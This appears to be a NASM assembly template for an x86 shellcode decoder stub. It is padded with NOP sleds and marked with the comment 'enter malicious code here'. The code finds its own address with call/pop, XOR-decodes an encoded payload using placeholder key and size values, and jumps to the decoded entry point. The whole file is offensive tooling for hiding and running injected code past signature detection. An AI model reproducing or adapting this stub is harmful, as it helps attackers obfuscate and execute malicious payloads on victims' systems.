global _start
  
section .text

_start:
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    
; -------------------------------------------
; enter malicious code here
; -------------------------------------------

; <OFFSET_TO_CODE_BOTTOM> - offset from current decoder to last byte of code
; <DECODER_KEY>           - decoder key
; <CODE_SIZE>             - size of encoded code
; <OFFSET_TO_ENTRY_POINT> - offset from code beginning to entry point
    
    call    get_proc                        ; push return address
    
get_proc:
    pop     esi                             ; pop current address
    sub     esi, 0x5                        ; esi = address of injected code, 0x5 = size of call instruction
    sub     esi, <OFFSET_TO_CODE_BOTTOM>    ; esi = address of last code byte
    
    xor     ebx, ebx                        ; clear registers
    xor     ecx, ecx                        ;
    
    mov     bl,  <DECODER_KEY>              ; decoder key
    mov     ecx, <CODE_SIZE>                ; encoded code size
    
    sub     esi, ecx                        ; esi = address of encoded code

decoder_loop:
    mov     edx, esi                        ; construct encoded byte address
    add     edx, ecx                        ;
    dec     edx                             ;
    xor     byte [edx], bl                  ; decode
    loop    decoder_loop                    ; loop back
    
    add     esi, <OFFSET_TO_ENTRY_POINT>    ; esi = address of entry point
    jmp     esi                             ; jump back to decoded code
    
; -------------------------------------------
    
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop